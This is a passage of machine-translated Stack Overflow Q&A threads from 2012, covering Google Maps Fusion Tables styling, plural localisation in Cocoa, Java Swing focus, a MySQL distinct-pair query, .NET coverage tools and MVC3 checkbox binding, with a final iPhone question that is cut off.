            { saturation: 99 }
          ]
        },
        {
          featureType: 'road.highway',
          elementType: 'all',
          stylers: [
            { visibility: 'off' }
          ]
        },
        {
          featureType: 'road.arterial',
          elementType: 'all',
          stylers: [
            { visibility: 'off' }
          ]
        },
        {
          featureType: 'road.local',
          elementType: 'all',
          stylers: [
            { visibility: 'off' }
          ]
        },
        {
          featureType: 'administrative.country',
          elementType: 'all',
          stylers: [
            { visibility: 'off' }
          ]
        },
        {
          featureType: 'administrative.locality',
          elementType: 'all',
          stylers: [
            { visibility: 'off' }
          ]
        },
        {
          featureType: 'administrative.neighborhood',
          elementType: 'all',
          stylers: [
            { visibility: 'off' }
          ]
        },
        {
          featureType: 'administrative.land_parcel',
          elementType: 'all',
          stylers: [
            { visibility: 'off' }
          ]
        },
        {
          featureType: 'poi',
          elementType: 'all',
          stylers: [
            { visibility: 'off' }
          ]
        },
        {
          featureType: 'transit',
          elementType: 'all',
          stylers: [
            { visibility: 'off' }
          ]
        }
      ];

     var map_options = {
      center: cz["center"], //Accesses the 'center' property of the 'cz' object
      zoom: cz["zoom"], //Accesses the 'zoom' property of the 'cz' object
      mapTypeId: google.maps.MapTypeId.ROADMAP, //Type of map.
      zoomControlOptions: { //control options for the 'zoom' action of Google Maps
        style: google.maps.ZoomControlStyle.SMALL, //Makes the zoom function on the upper-left-side of Google Maps small -- instead of a scale-like thing, it's just a plus and minus
        position: google.maps.ControlPosition.LEFT_CENTER //Puts Zoom function center-left
      },
      streetViewControl: false, //Turns off Street View option
      panControl: false, //turns off the circular pan button in nupper-left
      mapTypeControl: false //Turns off 'MAP/SATELLITE' option in upper-right
    }; 

     var locationQuery = {
      select: locationColumn,
          from: tableRegion
     };

     function initialize() {
      //new Google Map with the 'map_options' 
      map = new google.maps.Map(document.getElementById('map-canvas'), map_options);

      //Styles the map so it removes roads, saturates things, etc. See 'mapStyle'
      var style = mapStyle;
      var styledMapType = new google.maps.StyledMapType(style, {
        map: map,
        name: 'Styled Map'
      });
      map.mapTypes.set('map-style', styledMapType);
      map.setMapTypeId('map-style'); 

      //Makes the Fusion Tables layer, querying the polygon location info
      layer = new google.maps.FusionTablesLayer({
        query: locationQuery,

    //Here's where I try setting the colors and conditions for my map. Doesn't work.
    styles: [{
      polygonOptions: {
        fillColor: "#FFFFFF",
        fillOpacity: 0.5
      }
    },{
      where: "price > 200",
      polygonOptions: {
        fillColor: "#FFFF00",
        fillOpacity: 0.5
      }
    }]
      });
      layer.setMap(map);
    }
    google.maps.event.addDomListener(window, 'load', initialize);
  </script>
  </head>
  <body>
    <div id="map-canvas"></div>
  </body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T18:59:44.830

FusionTables 可能存在问题。当我尝试在本地运行它时（我得到了带有可怕的“数据可能仍在加载，拖动或刷新页面以找出答案”的图块），当我终于开始[上传副本](http://www.geocodezip.com/v3_FusionTables_styleEx_unmod.html)时，它也对我不起作用，它起作用了，但后来它在本地也起作用了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T10:54:26.203

你没有说明你的确切问题是什么，除了它不起作用。 *不是很有帮助。*所以我猜。你的地图对我来说很好用。没问题。尝试在下面的代码中设置 fillOpacity: 1 以查看它是否正常工作。通过使用 0.5，您允许底图颜色与 FT 图层颜色混合。

```
styles: [{
      polygonOptions: {
        fillColor: "#FFFFFF",
        fillOpacity: 0.5
      }
    },{
      where: "price > 200",
      polygonOptions: {
        fillColor: "#FFFF00",
        fillOpacity: 0.5
      }
    }] 
```

# objective-c - 国际化数字和数量

> ID：11271216
> 
> 赞同：1
> 
> 时间：2012-06-30T03:41:00.117
> 
> 标签：objective-c, cocoa, internationalization, nsnumberformatter

我不确定如何在以下情况下正确使用 NSNumberFormatter 并正确保持本地化/国际化。

英文输出：

```
0 bananas
1 banana
5 bananas 
```

我应该怎么做才能正确保持国际化/本地化？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T06:41:25.150

复数的国际化是一个难题。我不是专家，但是除了英语简单的“1 是单数，所有其他都是复数”之外，各种语言都有各种复数方案。某些语言对 0、1、2、3 和 >3 有不同的形式。鉴于语言的复杂性，可能还有更复杂的方案。

Cocoa 中的任何内容，包括`NSNumberFormatter`，都没有提供任何帮助，而不仅仅是`NSLocalizedString`和朋友的正常字符串本地化。因此，您可以使用`NSLocalizedString`“0 香蕉”、“1 香蕉”、“2 香蕉”、“3 香蕉”和“%d 香蕉”等键。然后，使用一个开关来加载您希望格式化的实际香蕉数量的开关。

另一种方法是使用类似“bananas: %d”的字符串。

或者，您可以通过为 0、1 和 >1 提供本地化字符串来组合技术，并建议翻译人员在这些形式不足以满足他们的语言时切换到平底船样式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T09:10:48.330

肯回答得很好。

我会添加这个。

首先，最好将完整的短语提供给翻译人员，因为不同语言的语法差异很大。但这还不够。您必须准备好处理翻译团队的一些请求。例如，在法语中，船被翻译成 le bateau，飞机被翻译成 l'avion（而不是 le avion）。翻译人员经常使用技巧来避免这种情况，引入特殊情况，但这并不总是可能的，也不可取。

与翻译团队合作寻找最佳解决方案，并尽可能将特定案例推广到所有语言，以使代码保持语言中立。几个相同的字符串优于代码中的语言特定情况。

随着时间和经验，你会习惯这一点。我在以多种语言本地化的软件工作了 10 多年（我认为在 7 到 23 之间，不完全确定 23 ；）。您将了解问题出在哪里以及这些语言的一些细节。顺便说一句，没有那么多问题：复数、体裁、缩略词是最常见的。格式通常由系统语言环境 API 很好地处理。这很有趣！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T00:05:15.717

我刚刚发布了[JJPluralForm](https://github.com/junjie/JJPluralForm)，它是 Mozilla 的 PluralForm 的改编版。

有了这个，你就不必担心在你的代码中做所有的`if-else`,`switch-case`代码来进行本地化，随着本地化数量的增加，这变得不可能维护（俄语有 3 个复数规则，阿拉伯语有 6 个，等等） .

可以处理类似于您给出的示例的内容：

```
[[JJPluralForm sharedManager] pluralStringForNumber:numberOfBananas
                                    withPluralForms:NSLocalizedString(@"N_BANANAS_PLURAL_STRING", @"")
                                    localizeNumeral:YES]; 
```

然后将每个 Localizable.strings 文件本地化`N_BANANAS_PLURAL_STRING`为以分号分隔的复数形式列表。对于英语，那将是`"%@ banana;%@ bananas"`.

查看该项目以获取更多详细信息。

# java - java：表单加载时将焦点设置到文本字段

> ID：11271226
> 
> 赞同：3
> 
> 时间：2012-06-30T03:44:08.540
> 
> 标签：java, swing, netbeans

我有一个 jTextfield。我想在加载表单时将重点放在此上。我怎样才能做到这一点？我正在使用 Netbeans。我使用`requestFocus()`但它不起作用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T03:46:58.057

此链接可能对您有帮助：[如何使用焦点子系统](http://docs.oracle.com/javase/tutorial/uiswing/misc/focus.html)

我建议您使用 requestFocusInWindow() 而不是 requestFocus() 来实现所需的功能。

原因：（来自同一链接）

> 这些方法现在已弃用。不鼓励使用另一种方法 requestFocus，因为它试图将焦点赋予组件的窗口，这并不总是可行的。从 JDK 1.4 开始，您应该改用 requestFocusInWindow 方法，它不会尝试使组件的窗口聚焦。该方法返回一个布尔值，指示该方法是否成功。

这将是一个粗略的示例，但我认为您可以使用它来开始：

```
import java.awt.BorderLayout;
import java.awt.Dimension;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JTextField;

public class TestFrame extends JFrame {

    JButton button1;
    JButton button2;

    JTextField textField;

    public TestFrame() {
        initComponents();
    }

    private void initComponents(){
        button1 = new JButton("Button 1");
        button2 = new JButton("Button 2");
        textField = new JTextField();

        button1.setPreferredSize(new Dimension(100,20));
        button2.setPreferredSize(new Dimension(100,20));
        textField.setPreferredSize(new Dimension(300,20));

        this.setSize(new Dimension(600, 300));
        this.setLayout(new BorderLayout());

        getContentPane().add(button1, BorderLayout.WEST);
        getContentPane().add(button2, BorderLayout.CENTER);
        getContentPane().add(textField, BorderLayout.EAST);
        this.pack();
        this.setVisible(true);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        //This will set focus on the text field
        textField.requestFocusInWindow();
    }

    public static void main(String[] args) {
        javax.swing.SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                new TestFrame();
            }
        });
    }
} 
```

**最新编辑：对于 NETBEANS**

使用的代码：

```
package focusexample;

public class FocusExample extends javax.swing.JFrame {

    public FocusExample() {
        initComponents();
        jTextField1.requestFocusInWindow();
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">
    private void initComponents() {

        jButton1 = new javax.swing.JButton();
        jButton2 = new javax.swing.JButton();
        jTextField1 = new javax.swing.JTextField();
        jTextField2 = new javax.swing.JTextField();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jButton1.setText("jButton1");

        jButton2.setText("jButton2");

        jTextField1.setText("jTextField1");

        jTextField2.setText("jTextField2");

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGap(87, 87, 87)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(jButton1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jTextField1))
                .addGap(69, 69, 69)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(jButton2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jTextField2))
                .addContainerGap(98, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGap(95, 95, 95)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jButton1)
                    .addComponent(jButton2))
                .addGap(58, 58, 58)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jTextField2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap(104, Short.MAX_VALUE))
        );

        pack();
    }// </editor-fold>

    public static void main(String args[]) {

        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(FocusExample.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(FocusExample.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(FocusExample.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(FocusExample.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        java.awt.EventQueue.invokeLater(new Runnable() {

            public void run() {
                new FocusExample().setVisible(true);                
            }
        });
    }
    // Variables declaration - do not modify
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton2;
    private javax.swing.JTextField jTextField1;
    private javax.swing.JTextField jTextField2;
    // End of variables declaration
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-31T21:45:47.753

我使用了 textfield.requestFocusInWindow(); 上面给出的行，在一个包含许多表单元素（其中几个是文本字段）的 GUI 中。它工作得很好。只需将“textfield”替换为您为相关元素指定的任何名称。就我而言，它是repId。所以我使用 repID.requestFocusInWindow(); 并将该行放在我的 ENTER 按钮处理程序的底部。现在，当用户在表单域中输入数据并按下 ENTER 时，焦点将返回到第一个文本域：“repID”。感谢你的回答。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-02-14T22:46:17.410

Also of note, make sure you place the `requestFocusInWindow()` method after the `pack()` method. When I was placing the `requestFocusInWindow()` method before the `pack()` method, it didn't work. I placed the `requestFocusInWindow()` method after the `pack()` method and it worked. Little things like that just make life so much easier for us n00bs.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-03-05T13:27:42.517

我希望这个例子能帮助你：

```
 JTextField inputText = new JTextField(20);

        frame.addWindowFocusListener(new WindowAdapter() {
        public void windowGainedFocus(WindowEvent e) {
            inputText.requestFocusInWindow();
        }
    }); 
```

# .net-micro-framework - .net 微框架的 Netduino 程序员

> ID：11271228
> 
> 赞同：0
> 
> 时间：2012-06-30T03:45:15.437
> 
> 标签：.net-micro-framework, netduino

在印度哪里可以买到 Netduino？从上个月开始，我一直在寻找 Netduino 开发板，但在印度（德里）没有找到。如果有人有这些信息，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T07:45:01.163

我不知道您是否可以从印度获得它，但您应该可以从其他国家订购一个。我从[Floris.cc](http://www.pieterfloris.nl/shop/)购买了我的，因为它在斯堪的纳维亚半岛没有。

# mysql - 具有不同和最大值的MYSQL查询

> ID：11271234
> 
> 赞同：2
> 
> 时间：2012-06-30T03:46:09.147
> 
> 标签：mysql, sql

我需要一个 mysql 查询，它将选择“to”或“from”列中包含“joe”的所有行。它需要在“to”和“from”列中区分，这意味着名称出现的顺序无关紧要。即“joe”、“bob”应与“bob”、“乔”。如果一对名称中有重复项，请选择具有最大 id 的名称。决赛桌也应该按 id 降序排序。例如，对下表运行查询：

前：

```
id  to    from     
---|-----|------
1  | joe | bob | 
2  | bob | hal |
3  | joe | joe |
4  | sue | joe |
5  | bob | bob |
6  | bob | joe |
7  | hal | hal |
8  | joe | bob | 
```

后：

```
id  to    from     
---|-----|------
8  | joe | bob | 
4  | sue | joe |
3  | joe | joe | 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T03:58:04.053

尝试使用 GROUP BY 分组方式（从、到）按字母顺序排序：

```
SELECT id, `from`, `to`
FROM yourtable
WHERE id IN
(
    SELECT MAX(id)
    FROM yourtable
    WHERE `from` = 'joe' OR `to` = 'joe'
    GROUP BY LEAST(`from`, `to`), GREATEST(`from`, `to`)
)
ORDER BY id DESC 
```

在线查看它：[sqlfiddle](http://sqlfiddle.com/#!2/fc622/3)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:21:04.857

嗯...我可以接近：

```
SELECT inside.id, inside.`to` , inside.`from` 
FROM (
  SELECT MAX( id ) id,  `to` ,  `from` 
  FROM people
  WHERE  `to` =  'joe'
  OR  `from` =  'joe'
  GROUP BY  `to` ,  `from`
)inside
ORDER BY inside.id DESC 
```

但这并不能完全给出您想要的结果，因为在交换 to 和 from 时它仍然具有欺骗性。

我正在尝试使用一些`UNION`'s，但这实际上最终使问题复杂化，因为它最终创建了更多独特的列（我将交换顺序`to`并将`from`所有 joe's 放入同一列）。一旦你得到了正确的唯一行而不考虑这些`to`和`from`重要的事情，就很难把它放回原处`to`并且`from` **无关紧要**。

也许这会让你开始，而我又对此感到困惑。

# code-coverage - .NET 代码覆盖率监控

> ID：11271244
> 
> 赞同：0
> 
> 时间：2012-06-30T03:48:11.733
> 
> 标签：code-coverage

部署了多个 .NET Web 应用程序的登台服务器。有没有办法通过一些工具来监控代码覆盖率？

我正在尝试向测试团队公开代码覆盖率。我知道我们可以有自动化的单元测试用例，但在某些情况下需要手动测试用例来进行实验。

基本上，我想确保在测试团队签署生产部署之前，所有修改过的源文件都包含在登台服务器上的一些场景中。

我试图让测试人员更加了解未涵盖的内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T03:52:25.667

如果您使用 nuNit 测试，我会说使用 JetBrains、NCover 的 DotCover，或者开源版本是部分封面，不再添加到新功能中。

我使用 NCover，我喜欢它，我也玩过 DotCover，它也很不错。

显然 NCover 4 有很多新功能，它们甚至为测试人员提供了一个 ide，因此即使您不是开发人员，您也可以查看代码覆盖率并努力建立良好的测试基础。

Open Cover 还支持 32 位和 64 位，目前正在开发中。

[https://github.com/sawilde/opencover](https://github.com/sawilde/opencover)

[http://www.ncover.com/products/home#](http://www.ncover.com/products/home#)

[http://www.jetbrains.com/dotcover/](http://www.jetbrains.com/dotcover/)

[https://github.com/sawilde/partcover.net4/](https://github.com/sawilde/partcover.net4/)

# tfs - 在使用 RestSharp 进行 POST 之前尽早访问底层 HttpWebRequest

> ID：11271245
> 
> 赞同：2
> 
> 时间：2012-06-30T03:48:19.647
> 
> 标签：tfs, httpwebrequest, restsharp

我想使用 RestSharp 对 TFS 服务器进行 POST，但我需要在调用之前对 Web 请求进行一些相当复杂的操作。

为此，我需要访问底层 HttpWebRequest 以进行“准备”样式调用。

RestSharp有可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-01T08:00:08.067

RestSharp 不直接公开 HttpWebRequest，因此您最好编写自己的自定义包装器。

# c# - 用于在数据库表 C# MVC3 中选择和保存值的多个复选框

> ID：11271249
> 
> 赞同：0
> 
> 时间：2012-06-30T03:49:28.397
> 
> 标签：c#, asp.net-mvc-3, checkbox

我正在进行的项目要求我在表单上放置复选框，以便用户可能选择多个项目。我可以将这些作为布尔值放在单独的列中，但复选框值可能会更改或需要添加。所以我创建了一个包含这些复选框名称的表格，然后将它们列出来。我的问题是；我如何将这些值放入与客户一致的另一个表中。这应该如何正确处理？

该视图具有公司名称和记录 ID /AuditSchedule/details/208 我已经读到在列中放置多个值不是一个好习惯，但我还有什么其他选择？

非常感谢！

我为客户表提供的是 ProductType 字段。这与任何事情无关。还有另一个包含产品类型的表格，我想将其列为复选框。我在这两个表之间没有任何关系。对我来说似乎不应该有，但请纠正我，让我知道是否应该有。So when a check box is selected i want that value (ProductName) to be put in the customer table in the ProductType field separated with commas.

这是客户或计划表：

```
 public class AuditSchedule
{
    public virtual int AuditScheduleID { get; set; }
    public virtual Nullable<DateTime> audit_completed_date { get; set; }
    public virtual string gl_cmp_key { get; set; }
    public virtual string audit_year { get; set; }
    public virtual string ar_ship_key { get; set; }
    public virtual string ar_ship_name { get; set; }
    public virtual string im_adres_city { get; set; }
    public virtual string im_adres_state { get; set; }
    public virtual string audit_type { get; set; }
    public virtual string audit_no { get; set; }
    public virtual string audit_group { get; set; }
    public virtual string Footage { get; set; }
    public virtual string Rolling3MosFootage { get; set; }
    public virtual string snp_SalesRep8 { get; set; }
    public virtual string epg_sales_rep_accountable { get; set; }
    public virtual string tech_service_rep { get; set; }
    public virtual string audit_done_by { get; set; }
    public virtual Nullable<DateTime> audit_recieved_date { get; set; }
    public virtual string audit_notes { get; set; }
    public virtual string audit_pdf { get; set; }
    public virtual string updated { get; set; }
    public virtual string hidden { get; set; }
    public virtual string en_stats_key { get; set; }
    public virtual string Control_ID { get; set; }
    public virtual Nullable<DateTime> audit_date { get; set; }
    public virtual string contacts_present { get; set; }
    public virtual string audit_furnished_to { get; set; }
    public virtual string spacer_type { get; set; }
} 
```

这是产品表：

```
 public class SpacerProduct
{
    public int SpacerProductID { get; set; }
    public string SpacerBrand { get; set; }
    public string SpacerName { get; set; }
} 
```

希望这可以帮助

该视图是 AuditSchedules 的表单类型编辑，只有几个地方需要填写。这部分有效。将复选框添加到视图是我迷路的地方。我创建了一个填充复选框的 ToList 的局部视图，然后将其添加到表单中。不知道如何得到表中的结果。

Tohid 的问题：我对一些事情有疑问。首先是 ViewModel，我假设这只是你的 Models 目录的命名空间，而我的只是 Models。_db.getAuditScheduleById 不在我的实体中，您解释说我可能必须采取另一种方式。对我来说它将是 _db.AuditSchedules 它出现在下拉列表中但不喜欢它所以我将其更改为更新 07/02/2012 viewModel.AuditScheduleInstance = _db.AuditSchedules.Single(r => r.AuditScheduleID == id) ;

我仍然有一个问题

```
_db.GetAvailableSpacerProducts() 
```

我的实体中没有任何反映这一点的东西，我不知道如何改变它。可能类似于我在另一个中所做的更改，但不确定。

2012 年 7 月 5 日更新

这是QQAEntities：

命名空间 QQAForm.Models

```
{
public class QQAEntities : DbContext
   {
    public DbSet<AuditSchedule> AuditSchedules { get; set; }
    public DbSet<Category> Categories { get; set; }
    public DbSet<SubCategory> SubCategories { get; set; }
    public DbSet<MainQuestion> MainQuestions { get; set; }
    public DbSet<Suggestion> Suggestions { get; set; }        
    public DbSet<DocumentLink> DocumentLinks { get; set; }
    public DbSet<Audit> Audits { get; set; }
    public DbSet<AuditData> AuditDatas { get; set; }
    public DbSet<SpacerProduct> SpacerProducts { get; set; }
    public DbSet<ScoreCard> ScoreCards { get; set; }

   }
} 
```

我的解决方案中还有另一个名为 QQAForm.Data 的项目，它仅控制与成员资格相关的所有内容的角色和安全性。希望这可以帮助。感谢您的时间和耐心。

2012 年 7 月 6 日更新

最终工作编辑：

```
 [HttpPost]
    public ActionResult Edit(AuditScheduleEdit viewModel)
    {            
        if (ModelState.IsValid)
        {
            viewModel.PopulateCheckBoxsToSpacerType();
            _db.Entry(viewModel.AuditScheduleInstance).State = System.Data.EntityState.Modified;
            _db.SaveChanges();
            return RedirectToAction("Index");
        }
        else
        {
            return View(viewModel);
        }

    } 
```

2012 年 8 月 2 日更新

我已经决定我可以在这个项目的其他领域使用它。我有多个使用复选框的地方。

我试图在另一个视图上实现它，但它不起作用。它不起作用的原因是因为为了填充复选框，它会查看当前表中的 ID，以便可以更新它。这是片段：

```
 //get
    public ActionResult _Forms(int id)
    {
        AuditFormEdit viewModel = new AuditFormEdit();
        viewModel.ScoreInstance = _db.MainAnswers.Single(r => r.MainAnswerID == id);
        viewModel.InitializeScoreCheckBoxHelperList(_db.Scores.ToList());
        return View(viewModel);
    }

    //post
    [HttpPost]
    public ActionResult _Forms(int id, AuditFormEdit viewModel)
    {
        if (ModelState.IsValid)
        {
            viewModel.PopulateCheckBoxsToScores();
            _db.Entry(viewModel.ScoreInstance).State = System.Data.EntityState.Modified;
            _db.SaveChanges();
            return RedirectToAction("/");
        }
        else
        {
            return View(viewModel);
        }
    } 
```

(r => r.MainAnswerID == id) 是问题所在。MainAnswer 是需要更新的表。该记录还应插入 AuditScheduleID、MainQuestionID 和从 Score 复选框填充的文本。如果我对此发表评论，我将一无所获。我真正需要的是一种方法来接受这个并用数据插入一条新记录。不知道如何更改代码来执行此操作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T13:26:20.923

如果我理解正确，您是在说：

1.  类*Customer*有一个`string`名为*ProductType*的属性，其中包含以逗号分隔的*ProductType*名称字符串。
2.  类*ProductType*有一个`string`属性*ProductName*。
3.  在视图中，任何*ProductType*都显示为复选框，并且可以为每个客户选择/取消选择。

正确的？对我来说，这看起来像是**多对多的关系**。

您是否阅读过 MVC 教程的这一章：[使用 MVC 开始使用 EF](http://www.asp.net/mvc/tutorials/getting-started-with-ef-using-mvc)？特别是这部分：[为 ASP.NET MVC 应用程序创建更复杂的数据模型](http://www.asp.net/mvc/tutorials/getting-started-with-ef-using-mvc/creating-a-more-complex-data-model-for-an-asp-net-mvc-application)

对我来说，如果您将`Customer.ProductType`from类型更改`string`为`List<ProductType>`它可以解决所有问题。

但是，通过保持`Customer.ProductType`as `string`，它仍然可以解决。

**代码**

根据`AuditSchedule`和`SpacerProduct`类（模型），我开发了一个新的 VeiwModel 类。将 ViewModel 视为一个容器，它打包其他类并准备好将它们发送到 View。

```
namespace MvcApplication1.ViewModels
{
    public class AuditScheduleEdit
    {
        public Models.AuditSchedule AuditScheduleInstance { get; set; }

        public List<SpacerProductCheckBoxHelper> SpacerProductCheckBoxHelperList { get; set; }

        public void InitializeSpacerProductCheckBoxHelperList(List<Models.SpacerProduct> SpacerProductList)
        {
            if (this.SpacerProductCheckBoxHelperList == null)
                this.SpacerProductCheckBoxHelperList = new List<SpacerProductCheckBoxHelper>();

            if (SpacerProductList != null
                && this.AuditScheduleInstance != null)
            {
                this.SpacerProductCheckBoxHelperList.Clear();
                SpacerProductCheckBoxHelper spacerProductCheckBoxHelper;
                string spacerTypes =
                    string.IsNullOrEmpty(this.AuditScheduleInstance.spacer_type) ?
                    string.Empty : this.AuditScheduleInstance.spacer_type;
                foreach (Models.SpacerProduct spacerProduct in SpacerProductList)
                {
                    spacerProductCheckBoxHelper = new SpacerProductCheckBoxHelper(spacerProduct);
                    if (spacerTypes.Contains(spacerProduct.SpacerName))
                        spacerProductCheckBoxHelper.Checked = true;
                    this.SpacerProductCheckBoxHelperList.Add(spacerProductCheckBoxHelper);
                }
            }
        }

        public void PopulateCheckBoxsToSpacerType()
        {
            this.AuditScheduleInstance.spacer_type = string.Empty;
            var spacerTypes = this.SpacerProductCheckBoxHelperList.Where(x => x.Checked)
                                  .Select<SpacerProductCheckBoxHelper, string>(x => x.SpacerName)
                                  .AsEnumerable();
            this.AuditScheduleInstance.spacer_type = string.Join(", ", spacerTypes);
        }

        public class SpacerProductCheckBoxHelper : Models.SpacerProduct
        {
            public bool Checked { get; set; }

            public SpacerProductCheckBoxHelper() : base() { }

            public SpacerProductCheckBoxHelper(Models.SpacerProduct spacerProduct)
            {
                this.SpacerProductID = spacerProduct.SpacerProductID;
                this.SpacerName = spacerProduct.SpacerName;
                this.SpacerBrand = spacerProduct.SpacerBrand;
            }
        }
    }
} 
```

所以这里是相关控制器的编辑方法：

```
 public ActionResult Edit(int id)
    {
        AuditScheduleEdit viewModel = new AuditScheduleEdit();
        viewModel.AuditScheduleInstance = _db.GetAuditScheduleById(id);
        viewModel.InitializeSpacerProductCheckBoxHelperList(_db.GetAvailableSpacerProducts());
        return View(viewModel);
    }

    [HttpPost]
    public ActionResult Edit(AuditScheduleEdit viewModel)
    {
        if(ModelState.IsValid)
        {
            viewModel.PopulateCheckBoxsToSpacerType();
            // TODO: Add update logic here
            return RedirectToAction("Index");
        }
        else
        {
            return View(viewModel);
        }
    } 
```

在第一个 Action (HttpGET) 中，我简单地构造 的实例，然后从我的数据库中`AuditScheduleEdit`分配请求( )（您可能有不同的方式从存储库中查询数据）。`AuditSchedule``_db.GetAuditScheduleById(id)`

然后必须将一个集合`SpacerProducts`传递给`InitializeSpacerProductCheckBoxHelperList()`函数（对不起，因为名字很长，试图清晰易懂！）。此函数创建一个列表，`SpacerProductCheckBoxHelper`用于在视图上生成复选框。

当用户提交表单时，`AuditScheduleEdit`重新创建（基于表单数据）并将被发送到第二个编辑操作（HttpPost）。在那里，`PopulateCheckBoxsToSpacerType()`将选中的复选框列表转换为逗号分隔的字符串并将其分配给`AuditSchedule.spacer_type`

这是视图：

```
@model MvcApplication1.ViewModels.AuditScheduleEdit
@using (Html.BeginForm())
{
    <div>
        <h3>Audi Schedule</h3>
        @Html.LabelFor(m => m.AuditScheduleInstance.AuditScheduleID)
        @Html.DisplayFor(m => m.AuditScheduleInstance.AuditScheduleID)
        @Html.HiddenFor(m => m.AuditScheduleInstance.AuditScheduleID)
        <br />
        @Html.LabelFor(m => m.AuditScheduleInstance.Control_ID)
        @Html.EditorFor(m => m.AuditScheduleInstance.Control_ID)
        // Here, add any field of AuditSchedule which needs to show on edit form 
        //       like what I did for AuditScheduleID and Control_ID.
        <h3>SpacerType</h3>
        @for (int index = 0; index < Model.SpacerProductCheckBoxHelperList.Count; index++)
        {
            @Html.CheckBoxFor(m => m.SpacerProductCheckBoxHelperList[index].Checked)
            @Html.LabelFor(m => m.SpacerProductCheckBoxHelperList[index], Model.SpacerProductCheckBoxHelperList[index].SpacerName)
            @Html.HiddenFor(m => m.SpacerProductCheckBoxHelperList[index].SpacerProductID)
            @Html.HiddenFor(m => m.SpacerProductCheckBoxHelperList[index].SpacerName)
            <br />
        }
    </div>
    <div>
        <input type="submit" value="Save" />
    </div>
} 
```

我在 Visual Studio developer 2010 Exp 中编写了这段代码，它运行良好。[您可以从这里下载此代码](https://docs.google.com/file/d/0B4inFc2_8uyKR0o0VERXbENYdms/edit?pli=1)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:17:27.283

我不清楚您提出的问题，但我假设当复选框值存储在您创建的表中时，您需要更新表（视图）中的记录。我认为不需要更新表，您只需要在两个表之间创建一个关系，然后您就可以在内部查询和连接的帮助下获取所有日期。

但是，如果您需要更新您的表格，您可以在您创建的表格中使用“插入后”触发器。如果您也可以共享表结构，那将非常有帮助。

您需要再创建一个表（以存储 itemselected 和正在选择它的客户的关系）与列（AuditScheduleID int，SpacerType int）该表应该在列上都有复合键，并且 1）列 AuditScheduleID 应该有外部与 Customer 表的键关系 2) 列 SpacerType 应该与 Product 表具有外键关系。3）当客户选择多个产品并提交时，每个产品的信息和 AuditScheduleID 应保存为上面创建的表格中的不同行。

现在您可以通过完全标准化以这种方式存储数据

# iphone - 通过代码在 iPhone 屏幕上显示对象

> ID：11271250
> 
> 赞同：-5
> 
> 时间：2012-06-30T03:49:36.993
> 
> 标签：iphone

这是我关于 Stack Overflow 的第一个问题，所以我希望我足够清楚。

我正在为 iPhone 设计游戏，但无法显示某些对象。我有一个 NSMutableArray 对象（子类 UIImageView 的自定义对象类），我希望能够将它们全部显示在屏幕上。但是，数组可以改变大小，所以我不能直接链接界面生成器中的每个元素。有谁知道我如何开始解决这个问题？

谢谢！

编码：

```
//This code is in the viewController.m file
//The main array of objects is nodeList. Each node subclasses UIImageView.
